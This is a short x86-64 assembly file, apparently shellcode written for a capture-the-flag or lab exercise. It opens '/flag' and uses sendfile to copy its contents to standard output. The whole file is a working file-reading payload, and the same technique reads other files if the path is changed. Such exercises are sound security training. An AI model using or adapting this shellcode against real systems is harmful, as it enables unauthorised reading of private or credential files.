.global _start
_start:
.intel_syntax noprefix
push 0x616c662f
mov dword ptr [rsp+4], 0x00000067
push rsp
push 2
pop rax
pop rdi
push 0
pop rsi
syscall

push 0x28
push 58
push 0
push rax
push 1
pop rdi
pop rsi
pop rdx
pop r10
pop rax
syscall
